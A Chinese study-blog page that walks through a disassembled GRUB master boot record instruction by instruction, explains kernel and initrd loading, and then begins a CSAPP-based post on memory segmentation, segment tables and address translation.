<p>猜测是后来<code>M[0x7c64]</code>会有改变,现在是第一次执行,尚且没变</p>
<p>这应该是一个指针</p>
<h4 id="00000083-7402-jz-0x87"><a href="#00000083-7402-jz-0x87" class="headerlink" title="00000083  7402        jz 0x87"></a><code>00000083  7402        jz 0x87</code></h4><p>如果刚才的检查通过,则跳转<code>0x87</code></p>
<p>由于<code>0x87</code>和<code>0x83</code>之间(即刚才的检查没通过时),只有一条指令,我们不跟随跳转</p>
<blockquote>
<p>这里检查我们是否有强制磁盘引用</p>
</blockquote>
<h4 id="00000085-88C2-mov-dl-al"><a href="#00000085-88C2-mov-dl-al" class="headerlink" title="00000085  88C2        mov dl,al"></a><code>00000085  88C2        mov dl,al</code></h4><p><code>0x81</code>处的检查没有通过,即<code>al</code>中不是<code>0xff</code>,是多少现在不知道,先放在<code>dl</code>中</p>
<p>在此之前涉及到<code>dl</code>寄存器的有一个<code>0000006D  B280              mov dl,0x80</code></p>
<p>dl置0x80是可引导分区的标志,现在把他改了,推测为后面引导失败埋下伏笔</p>
<p>首次执行,本条指令不会被执行</p>
<h4 id="00000087-52-push-dx"><a href="#00000087-52-push-dx" class="headerlink" title="00000087  52         push dx"></a><code>00000087  52         push dx</code></h4><p>dx寄存器中的东西压栈</p>
<p>dx中是啥呢?dh高位啃腚为0,低位有两种情况</p>
<p>如果<code>00000081  3CFF        cmp al,0xff</code>处的判断通过,则<code>dl=0x80</code></p>
<p>否则就不是第一次执行到这里了,<code>M[0x7c64]</code>已经发生过改变</p>
<p>我们按照第一次执行的逻辑,dx就是0xff</p>
<blockquote>
<p>此时栈中状态</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614160219999.png" alt="image-20220614160219999"></p>
</blockquote>
<h4 id="00000088-BB1704-mov-bx-0x417"><a href="#00000088-BB1704-mov-bx-0x417" class="headerlink" title="00000088  BB1704       mov bx,0x417"></a><code>00000088  BB1704       mov bx,0x417</code></h4><p><code>0x417-&gt;bx</code></p>
<h4 id="0000008B-802703-and-byte-bx-0x3"><a href="#0000008B-802703-and-byte-bx-0x3" class="headerlink" title="0000008B  802703       and byte [bx],0x3"></a><code>0000008B  802703       and byte [bx],0x3</code></h4><blockquote>
<p>关于属性运算符</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614114636880.png" alt="image-20220614114636880"></p>
</blockquote>
<p>bx在上一条指令中已经置为<code>0x417</code>了</p>
<p>本条指令的意思是,首先进行一个寄存器间接寻址,取<code>M[R[bx]]=M[0x417]</code></p>
<p>取出该内存单元的最低字节的内容,看看最低位是不是两个1,如果是则置标志位<code>ZF=1</code></p>
<h4 id="0000008E-7406-jz-0x96"><a href="#0000008E-7406-jz-0x96" class="headerlink" title="0000008E  7406        jz 0x96"></a><code>0000008E  7406        jz 0x96</code></h4><p>如果刚才的判断通过,则跳转<code>0x96</code></p>
<p>跳转越过了<code>0x90,0x93</code>两条指令,这是一个函数调用</p>
<h4 id="00000090-BE887D-mov-si-0x7d88"><a href="#00000090-BE887D-mov-si-0x7d88" class="headerlink" title="00000090  BE887D       mov si,0x7d88"></a><code>00000090  BE887D       mov si,0x7d88</code></h4><p>把<code>0x7d88</code>放在si寄存器,作为串操作的源头</p>
<p>而<code>0x7d88</code>上放的是啥呢?</p>
<p><code>0x7d88</code>相对于本文件基地址的偏移量为<code>0x7d88-0x7c00=0x188</code></p>
<p>去这个地方看一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00000188  47                inc di</span><br><span class="line">00000189  52                push dx</span><br><span class="line">0000018A  55                push bp</span><br><span class="line">0000018B  42                inc dx</span><br></pre></td></tr></table></figure>

<p>都是指令?这就奇怪了,串操作的源头是一些指令,而不是一个连续的数组.</p>
<p>目前我们只是看出了串操作的一点雏形,将”源”放在si寄存器中,但是用串操作干了什么,尚不可知,</p>
<p>我们暂且保持懵逼的状态,继续向后看,我保证后面有一刻,会恍然大悟</p>
<h4 id="00000093-E81C01-call-0x1b2"><a href="#00000093-E81C01-call-0x1b2" class="headerlink" title="00000093  E81C01       call 0x1b2"></a><code>00000093  E81C01       call 0x1b2</code></h4><p>调用位于<code>0x1b2</code>的函数</p>
<p>我们跟随该函数</p>
<h4 id="进入循环"><a href="#进入循环" class="headerlink" title="进入循环"></a>进入循环</h4><blockquote>
<p>该调用指令,实际上进入了一个循环,但是现在看不出来</p>
</blockquote>
<h4 id="000001B2-AC-lodsb"><a href="#000001B2-AC-lodsb" class="headerlink" title="000001B2  AC         lodsb"></a><code>000001B2  AC         lodsb</code></h4><blockquote>
<p>关于串装入指令</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614151353806.png" alt="image-20220614151353806"></p>
<p>说了个什么事情呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, ［esi］    ;将字节送入AL</span><br><span class="line">inc esi    ;指向下一个字节</span><br></pre></td></tr></table></figure>
</blockquote>
<p>在调用函数之前,<code>si&lt;-0x7d88</code></p>
<p><code>mov al, ［esi］</code>执行之后,<code>M[0x7d88]=M[0x188]-&gt;al</code></p>
<p><code>inc esi    ;</code>执行之后,<code>0x7d89-&gt;si</code></p>
<h4 id="000001B3-3C00-cmp-al-0x0"><a href="#000001B3-3C00-cmp-al-0x0" class="headerlink" title="000001B3  3C00        cmp al,0x0"></a><code>000001B3  3C00        cmp al,0x0</code></h4><p>比较al是不是0</p>
<h4 id="000001B5-75F4-jnz-0x1ab"><a href="#000001B5-75F4-jnz-0x1ab" class="headerlink" title="000001B5  75F4        jnz 0x1ab"></a><code>000001B5  75F4        jnz 0x1ab</code></h4><p>如果al不是0则跳转<code>0x1ab</code></p>
<h4 id="000001AB-BB0100-mov-bx-0x1"><a href="#000001AB-BB0100-mov-bx-0x1" class="headerlink" title="000001AB  BB0100       mov bx,0x1"></a><code>000001AB  BB0100       mov bx,0x1</code></h4><p><code>1-&gt;bx</code>,给后面的int指令设置参数</p>
<h4 id="000001AE-B40E-mov-ah-0xe"><a href="#000001AE-B40E-mov-ah-0xe" class="headerlink" title="000001AE  B40E        mov ah,0xe"></a><code>000001AE  B40E        mov ah,0xe</code></h4><p><code>0xe-&gt;ah</code>,给后面的int指令设置参数</p>
<h4 id="000001B0-CD10-int-0x10"><a href="#000001B0-CD10-int-0x10" class="headerlink" title="000001B0  CD10        int 0x10"></a><code>000001B0  CD10        int 0x10</code></h4><blockquote>
<p>此处的中断参考<a target="_blank" rel="noopener" href="https://zoxoy.club/post/Print-char-by-INT-0x10/">使用汇编语言触发BIOS中断INT 0x10进行屏幕输出 (zoxoy.club)</a></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614152209611.png" alt="image-20220614152209611"></p>
</blockquote>
<p>在<code>0x1AE</code>中ah已经被置为<code>0xe</code>,那么此中断就触发了屏幕输出,输出的是啥呢?</p>
<p>要显示的字符在AL上</p>
<p>可以看出来,从<code>0x1AB</code>到<code>0x1B5</code>是一个循环,循环打印字符到屏幕,循环停止的条件是碰见<code>\0</code>结束标志</p>
<p>字符来源是<code>0x1B2</code>的<code>lodsb</code>,是从<code>0x93</code>处的调用指令<code>00000093  E81C01       call 0x1b2</code>转移过来的</p>
<p><code>lodsb</code>操作串的来源是<code>00000090  BE887D       mov si,0x7d88</code>,即内存中<code>0x7d88</code>这个位置</p>
<p>现在我们必须要考虑清楚串操作的源头为啥是一伙子指令了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000188  47                inc di</span><br><span class="line">00000189  52                push dx</span><br><span class="line">0000018A  55                push bp</span><br><span class="line">0000018B  42                inc dx</span><br><span class="line">0000018C  2000              and [bx+si],al</span><br></pre></td></tr></table></figure>

<p>观察机器码,<code>0x47,0x52,0x55,0x42,0x00,0x20</code>(最后小端模式拆开)</p>
<p>好像前面几个都是ASCII可打印字符,尝试打印一下</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614153820258.png" alt="image-20220614153820258"></p>
<p>竟然打印出了”GRUB”字样,这绝对不是巧合,就应该是这个字符串</p>
<p><strong>原来是nasm软件无法区分指令和数据,将数据也反汇编成指令了</strong></p>
<p>那么<code>0x188到0x18c</code>对应<code>G,R,U,B,\0</code></p>
<p><code>0x18d</code>上放了一个20不应该和<code>0x18c</code>合起来分析</p>
<p>这意味着后面的反汇编很可能都是错误的,暂且不管后面的错误,我们刚才调用函数打印grub字符串的逻辑是没有错误的</p>
<p>在一开始我们使用010editor观察时,</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614160458438.png" alt="image-20220614160458438"></p>
<p>后面还有好多具有实际意义的字符串</p>
<p>Error的ASCII编码为<code>0x45 72 72 6f 72</code></p>
<p>确实后面的”指令”中,有这个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">000001A3  45                inc bp</span><br><span class="line">000001A4  7272              jc 0x218</span><br><span class="line">000001A6  6F                outsw</span><br><span class="line">000001A7  720D              jc 0x1b6</span><br></pre></td></tr></table></figure>

<p>由此可见这一大块都是字符串</p>
<h4 id="退出循环"><a href="#退出循环" class="headerlink" title="退出循环"></a>退出循环</h4><p>实际上”循环”就是指循环打印<code>0x188</code>上存好的<code>grub</code>字符串</p>
<p>跳出循环的条件是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000001B2  AC                lodsb</span><br><span class="line">000001B3  3C00              cmp al,0x0</span><br><span class="line">000001B5  75F4              jnz 0x1ab</span><br></pre></td></tr></table></figure>

<p>这里al为0,即指向<code>grub\0</code>最后这个<code>\0</code></p>
<p>跳出循环即执行<code>000001B7  C3         ret</code></p>
<h4 id="000001B7-C3-ret"><a href="#000001B7-C3-ret" class="headerlink" title="000001B7  C3         ret"></a><code>000001B7  C3         ret</code></h4><p>函数调用返回,返回到<code>00000093  E81C01       call 0x1b2</code>的下一句<code>00000096  BE057C       mov si,0x7c05</code></p>
<h4 id="00000096-BE057C-mov-si-0x7c05"><a href="#00000096-BE057C-mov-si-0x7c05" class="headerlink" title="00000096  BE057C       mov si,0x7c05"></a><code>00000096  BE057C       mov si,0x7c05</code></h4><p><code>0x7c05</code>作为串的源头,<code>0x7c05</code>上是什么呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000003  108ED0BC          adc [bp-0x4330],cl</span><br><span class="line">00000007  00B0B800          add [bx+si+0xb8],dh</span><br></pre></td></tr></table></figure>

<p><code>M[0x3]=BC</code></p>
<p><code>M[0x4]=D0</code></p>
<p><code>M[0x5]=8E</code></p>
<p><code>M[0x6]=10</code></p>
<p><code>M[0x7]=00</code></p>
<h4 id="00000099-F6C280-test-dl-0x80"><a href="#00000099-F6C280-test-dl-0x80" class="headerlink" title="00000099  F6C280       test dl,0x80"></a><code>00000099  F6C280       test dl,0x80</code></h4><p>检查dl上是否还是0x80</p>
<h4 id="0000009C-7448-jz-0xe6"><a href="#0000009C-7448-jz-0xe6" class="headerlink" title="0000009C  7448        jz 0xe6"></a><code>0000009C  7448        jz 0xe6</code></h4><p>如果dl上是0x80则跳转0xe6,如果不是则继续执行</p>
<p>不跟随跳转,继续执行</p>
<h4 id="0000009E-B441-mov-ah-0x41"><a href="#0000009E-B441-mov-ah-0x41" class="headerlink" title="0000009E  B441        mov ah,0x41"></a><code>0000009E  B441        mov ah,0x41</code></h4><p>ah高位置0x41,是为了给<code>int 0x13</code>指令设置参数</p>
<h4 id="000000A0-BBAA55-mov-bx-0x55aa"><a href="#000000A0-BBAA55-mov-bx-0x55aa" class="headerlink" title="000000A0  BBAA55       mov bx,0x55aa"></a><code>000000A0  BBAA55       mov bx,0x55aa</code></h4><p><code>0x55aa-&gt;bx</code>,<code>0x55aa</code>是主引导记录的魔数,这里应该是要进行某些判断了</p>
<h4 id="000000A3-CD13-int-0x13"><a href="#000000A3-CD13-int-0x13" class="headerlink" title="000000A3  CD13        int 0x13"></a><code>000000A3  CD13        int 0x13</code></h4><blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614161620001.png" alt="image-20220614161620001"></p>
</blockquote>
<h4 id="000000A5-5A-pop-dx"><a href="#000000A5-5A-pop-dx" class="headerlink" title="000000A5  5A         pop dx"></a><code>000000A5  5A         pop dx</code></h4><p>恢复<code>dx=0x80</code></p>
<h4 id="000000A6-52-push-dx"><a href="#000000A6-52-push-dx" class="headerlink" title="000000A6  52         push dx"></a><code>000000A6  52         push dx</code></h4><p><code>0x80</code>压栈</p>
<p>这两步显得很迷,退出来又放进去</p>
<blockquote>
<p>%dl 可能已被 INT 13 破坏，AH&#x3D;41H。 例如，在 AST BIOS 1.04 中会发生这种情况。所以通过重复出入栈来纠正。</p>
</blockquote>
<h4 id="000000A7-723D-jc-0xe6"><a href="#000000A7-723D-jc-0xe6" class="headerlink" title="000000A7  723D        jc 0xe6"></a><code>000000A7  723D        jc 0xe6</code></h4><p>如果标志位CF&#x3D;1则跳转</p>
<p>哪里置的标志位呢?</p>
<blockquote>
<p>jc指令与上面的int 13H ah&#x3D;41H中断例程形成配合。后者的作用是判断 BIOS 是否支持扩展int13中断，如果支持，则CF&#x3D;0，否则CF&#x3D;1，那么jc指令就可以根据 BIOS 是否支持扩展int13中断来执行不同位置的“子程序指令”。</p>
<p>一般现在新的支持LBA模式的主板和Win98自带的DOS7操作系统是支持扩展INT 13的。</p>
</blockquote>
<h4 id="000000A9-81FB55AA-cmp-bx-0xaa55"><a href="#000000A9-81FB55AA-cmp-bx-0xaa55" class="headerlink" title="000000A9  81FB55AA      cmp bx,0xaa55"></a><code>000000A9  81FB55AA      cmp bx,0xaa55</code></h4><p>显然之前bx置过0xaa55,此处零标志置1</p>
<h4 id="000000AD-7537-jnz-0xe6"><a href="#000000AD-7537-jnz-0xe6" class="headerlink" title="000000AD  7537        jnz 0xe6"></a><code>000000AD  7537        jnz 0xe6</code></h4><blockquote>
<p>此时标志位ZF不等于0，所以jnz 0xd8不进行跳转。</p>
<p>谨慎起见，这条指令和上一条指令配合使用，继jc 0xd8之后，再次对int 13H ah&#x3D;41H中断指令的结果进行确认。确认BIOS支持扩展int13。</p>
<p>0xd8 处的指令是 CHS 寻址模式的，即是说如果不支持 LBA 寻址模式，则使用 CHS。</p>
</blockquote>
<h4 id="000000AF-83E101-and-cx-byte-0x1"><a href="#000000AF-83E101-and-cx-byte-0x1" class="headerlink" title="000000AF  83E101       and cx,byte +0x1"></a><code>000000AF  83E101       and cx,byte +0x1</code></h4><blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614162458403.png" alt="image-20220614162458403"></p>
</blockquote>
<h4 id="000000B2-7432-jz-0xe6"><a href="#000000B2-7432-jz-0xe6" class="headerlink" title="000000B2  7432        jz 0xe6"></a><code>000000B2  7432        jz 0xe6</code></h4><p>不跳转</p>
<h4 id="000000B4-31C0-xor-ax-ax"><a href="#000000B4-31C0-xor-ax-ax" class="headerlink" title="000000B4  31C0        xor ax,ax"></a><code>000000B4  31C0        xor ax,ax</code></h4><p>ax寄存器置0</p>
<h4 id="000000B6-894404-mov-si-0x4-ax"><a href="#000000B6-894404-mov-si-0x4-ax" class="headerlink" title="000000B6  894404       mov [si+0x4],ax"></a><code>000000B6  894404       mov [si+0x4],ax</code></h4><p>此前si寄存器被置为0x7c05,现在将0放到0x7c09,0x7c0A上</p>
<blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614162653873.png" alt="image-20220614162653873"></p>
</blockquote>
<h4 id="000000B9-40-inc-ax"><a href="#000000B9-40-inc-ax" class="headerlink" title="000000B9  40         inc ax"></a><code>000000B9  40         inc ax</code></h4><p>ax&#x3D;0x1</p>
<h4 id="000000BA-8844FF-mov-si-0x1-al"><a href="#000000BA-8844FF-mov-si-0x1-al" class="headerlink" title="000000BA  8844FF       mov [si-0x1],al"></a><code>000000BA  8844FF       mov [si-0x1],al</code></h4><p>si-0x1指向0x7c04,将al的第字节0x1放进去</p>
<blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614162805804.png" alt="image-20220614162805804"></p>
</blockquote>
<h4 id="000000BD-894402-mov-si-0x2-ax"><a href="#000000BD-894402-mov-si-0x2-ax" class="headerlink" title="000000BD  894402       mov [si+0x2],ax"></a><code>000000BD  894402       mov [si+0x2],ax</code></h4><p>1放到0x7c07</p>
<blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614162856400.png" alt="image-20220614162856400"></p>
</blockquote>
<h4 id="000000C0-C7041000-mov-word-si-0x10"><a href="#000000C0-C7041000-mov-word-si-0x10" class="headerlink" title="000000C0  C7041000      mov word [si],0x10"></a><code>000000C0  C7041000      mov word [si],0x10</code></h4><p>0x10看成一个双字(高八位全0)放到0x7c05,0x7c06</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614162933671.png" alt="image-20220614162933671"></p>
<p>0x7c06应该为0</p>
<blockquote>
<p>为啥这里要用一个”WORD”,前面都没用?</p>
<p>因为这里直接把一个立即数放到内存上,没有经过寄存器,将寄存器搬到内存时,寄存器规格决定占用内存上几个单元</p>
<p>现在立即数0x10可以作为一个字节,可以作为一个字,一个双字等等,要用word规定一下0x10作为什么传送</p>
</blockquote>
<p>我太难了, 这暗无天日的反汇编分析什么时候是个头啊,不分析了放一个大佬的博客吧</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lijiewen2017/article/details/124574991"> MBR引导程序源码理解_背风衣人的博客-CSDN博客_mbr启动代码</a></p>
<h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p>不管Grub干了啥,总之,它最后加载了Kernel并把控制交给了Kernel</p>
<p>从哪里加载的kernel呢?在硬盘中,文件系统的<code>/boot/</code>下面,vmlinuz文件,比如</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614165129321.png" alt="image-20220614165129321"></p>
<p>问题是,现在的SATA硬盘驱动都是以模块方式添加的设备,在操作系统启起来之前,必然不可能载入模块</p>
<p>这个问题是用Initial RamDisk技术解决的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614235435725.png" alt="image-20220614235435725"></p>
<p>台湾人把它翻译成”虚拟文件系统”,实际上和VFS不是一个东西</p>
<p>到此,操作系统就起来了,后面操作系统(kernel)会检查各种硬件,然后启动各种服务</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/12/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/12/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/" class="post-title-link" itemprop="url">CSAPP-chapter9 内存管理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-12 11:18:00" itemprop="dateCreated datePublished" datetime="2022-06-12T11:18:00+08:00">2022-06-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-25 19:38:13" itemprop="dateModified" datetime="2023-09-25T19:38:13+08:00">2023-09-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612081358649.png" alt="image-20220612081358649"></p>
<h2 id="纯分段"><a href="#纯分段" class="headerlink" title="纯分段"></a>纯分段</h2><p>最初分段的目的是实现各段可以随意增长</p>
<blockquote>
<p>啥意思呢?在既没有分段也没有分页的年代,程序装载进入内存是紧挨着放的,一条指令或数据紧挨着一条指令或数据.这就导致一个啥后果呢?</p>
<p>我想使用malloc获取一些堆空间,但是堆已经被左右两个块夹住了,大小固定了,找不到想要的空闲空间</p>
<p>分段之后,各段在内存中任意位置存放,一个程序在内存中可能被分割成几块,不必连续存放,两个程序可能交叉着在内存中存放</p>
<p>如果堆就放在一个堆段,堆顶指针指向该段的一头,如果该方向上紧挨着没有其他段,那么堆就可以变大了</p>
</blockquote>
<p>分段还实现了,代码和数据的分离,代码放在一个段,数据放在一个段</p>
<blockquote>
<p>可以简单意淫一下分段是啥样的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">segment Code:</span><br><span class="line">	<span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,Data:buffer);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">segment Data:</span><br><span class="line">	<span class="type">char</span> buffer[]=<span class="string">&quot;helloworld&quot;</span></span><br></pre></td></tr></table></figure>

<p>只是意淫,因为x86-64上已经废除分段了,我也不知道真的分段程序怎么写</p>
<p>但是计组书上讲的老古董8086上的汇编语言是有明确的分段的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612074034741.png" alt="image-20220612074034741"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612074118371.png" alt="image-20220612074118371"></p>
</blockquote>
<p>分段使得段权限管理很方便</p>
<p>段的功能是由程序员指定的,程序员可以把只读代码都放一个Code段,可读写数据都放在Data段,只读数据都放在Rodata段等等,每个段都指定一下访问权限rwx就可以限定怎么访问它了,违反了指定好的权限的访问,操作系统会报告段错误</p>
<p>纯分段中是没有甚么”虚拟内存”概念的,因为虚拟内存的实现要分页,那么内存条子多大,地址空间就有多大,即物理内存</p>
<p>画个图意思意思纯分段系统上程序在内存中的存储状态:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220611090810424.png" alt="image-20220611090810424"></p>
<h3 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h3><p>作战时一个师下辖三个团,那么师部就得维护这三个团的信息,包括:</p>
<p>1.团部人员信息,这方便师部联系团指挥员,这可能在师部里有一个电话本本</p>
<p>2.该团当前所在位置,这方便师部部署战术任务<del>(注意战术动作)</del>,这可能在师部里有一个沙盘</p>
<p>3.该团当前人员数量,这方便师部进行伤亡统计和兵员补给,这可能师部里有一个专门记录的本本</p>
<p>同样,一个进程被分成若干段,每个段都是大小可变的,每个段可以被安排在内存的任意地址,每个段是甚么访问属性,这也需要一个数据结构维护</p>
<p>每个段占用一个表项,现在我们可以想到,该表项至少应该有的内容</p>
<p>1.段地址,进程访问该段必须</p>
<p>2.段大小,检查访问越界错误必须</p>
<p>3.段访问权限,段保护必须</p>
<p>想不出还需要维护段的啥信息了,是时候看看权威怎么想这个事情的了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220611091807512.png" alt="image-20220611091807512"></p>
<p>他的段表包括了三个项目:段号,段长,基址</p>
<p>段号是啥呢?程序员编程的时候会指定段名,比如Code,Data等,但是计算机并不喜欢这么长的信息,一个英文字母用ASCII编码都需要一个字节,那么一个”Code”就得编4字节,32位</p>
<p>如果程序员的程序就分了两个段,Data和Code,那么只用一个符号位就可以表示两种状态,分三段则需要2位</p>
<p>编译器会无视所有段名,将所有段从上到下顺次编号,这应该可以说是离散化的思想<a target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1496">P1496 火烧赤壁 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a></p>
<p>把名字都映射成顺次增加的整数还有一个好处就是,段号还需要存储在段表中吗?</p>
<p>段表第一项存第一段,段表第二项存第二段…</p>
<p>段表也只需要把编译器翻译成的0,1,2,…n号段按顺序存起来</p>
<p>那么实际上段表项只有段长和基址两个信息,而这些我们都想到了,我们甚至想到了保护措施</p>
<p><strong>在纯分段的系统上,段表被放在哪里呢?</strong></p>
<p>操作系统是常驻内存的,进程控制块PCB由操作系统维护,每个进程又只有一个段表,</p>
<p>那么很自然的就会想到,段表放在进程PCB中,由操作系统维护</p>
<p>果真如此吗?</p>
<p>非也,诚如是则PCB过于臃肿,操作系统占用的内存空间会因为段表变的非常大</p>
<p>实际上PCB只需要维护一个指向段表内存地址的指针和段表的长度</p>
<p>在进程被调度运行时,段表地址和段表长度会被放到硬件段表寄存器中</p>
<h3 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220611092650927.png" alt="image-20220611092650927"></p>
<p>加入纯分段系统上,给出一个32位的内存地址,</p>
<p>高16位为段号,低16位为段内偏移</p>
<p>高位地址为<code>0x0002h</code>,即段号,首先要和段表长度进行比较,如果段号大于等于段表长度则产生越界中断</p>
<p>如果段号小于段表长度,那么用段表地址+段号相当于一个基址变址寻址,去查2号段即段表里面从上往下数第三条记录,发现基址为<code>40K</code>,段长6K</p>
<p>低16位为<code>0x0100h=0.25K&lt;6K</code>因此该段内偏移量是合法的,不会发生越界中断</p>
<p>最终基址+段内偏移&#x3D;<code>1010 0000 0000 0000+1 0000 0000=1010 0001 0000 0000=0xA100</code>即物理地址</p>
<h3 id="地址空间维度"><a href="#地址空间维度" class="headerlink" title="地址空间维度"></a>地址空间维度</h3><p>纯分页系统中用户进程地址空间是一维的,直接给出一个物理地址就可以寻址</p>
<p>纯分段系统中用户进程地址空间是二维的,需要通过<code>段:段内偏移</code>指定一个物理地址</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612080803151.png" alt="image-20220612080803151"></p>
<p>每个段内都是从0开始开始编址</p>
<h3 id="分段的好处"><a href="#分段的好处" class="headerlink" title="分段的好处"></a>分段的好处</h3><p>1.方便共享</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612081026860.png" alt="image-20220612081026860"></p>
<p>代码和只读数据可以在物理内存中只有一个段,但被多个进程的段表项目指向</p>
<p>实际上后来的段页式中,共享库就是这样用的</p>
<h3 id="碎片"><a href="#碎片" class="headerlink" title="碎片"></a>碎片</h3><p>外部碎片:</p>
<p>画个图立刻清楚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612083115693.png" alt="image-20220612083115693"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612083039864.png" alt="image-20220612083039864"></p>
<p>内部碎片:</p>
<p>在内存分段系统上没有内部碎片问题</p>
<p>在分页系统上,假设一个页是4KB,一个进程的地址空间要33KB,那么前32K正好8页,第九页上只用了1KB,剩下这3KB就是内部碎片</p>
<h2 id="段页式"><a href="#段页式" class="headerlink" title="段页式"></a>段页式</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612083740271.png" alt="image-20220612083740271"></p>
<p>段页式结构,对用户来说,可以感受到的是分段,实际使用的时候和纯分段几乎相同</p>
<p>操作系统负责分页工作,对用户不可见</p>
<p>一个段可能由多个页组成,比如一个8K的段就有可能由两个4k的页组成,这个段就管理两个页</p>
<p>一个进程对应一个段表,每个段维护一个表,因此一个有多个段的进程对应多个页表</p>
<p>纯分段结构中,段表存放的是段基址和段长度,而段页式结构中,段表中存放的是页表长度,页表存放块号,页表存放的是内存块号</p>
<h2 id="从物理寻址到虚拟寻址"><a href="#从物理寻址到虚拟寻址" class="headerlink" title="从物理寻址到虚拟寻址"></a>从物理寻址到虚拟寻址</h2><p>虚拟内存是一伙子异想天开的人造出来的巧夺天工,在虚拟内存之前,是符合普通人认知的物理内存</p>
<p>计算机主存(目前可以直接认为成内存条)可以看成是一个巨大的数组,他有M个连续的单元,每个单元大小是一个字节,各个单元线性分布</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516182449307.png" alt="image-20220516182449307"></p>
<p>物理寻址就是直接在内存条上寻址,CPU想要读写哪个单元的内容,只需要指定该单元的编号,或者说下标</p>
<blockquote>
<p>物理寻址的一个相对完整的过程:</p>
<p>1.CPU指定物理地址,将该地址信息送到地址总线</p>
<p>2.CPU指定对该地址是读还是写操作,将该控制信息发往控制总线</p>
<p>3.CPU从数据总线上对相应内存单元进行读写操作</p>
</blockquote>
<p>既然物理寻址方法如此自然易懂,为什么还要引入一个相对晦涩的虚拟寻址呢?</p>
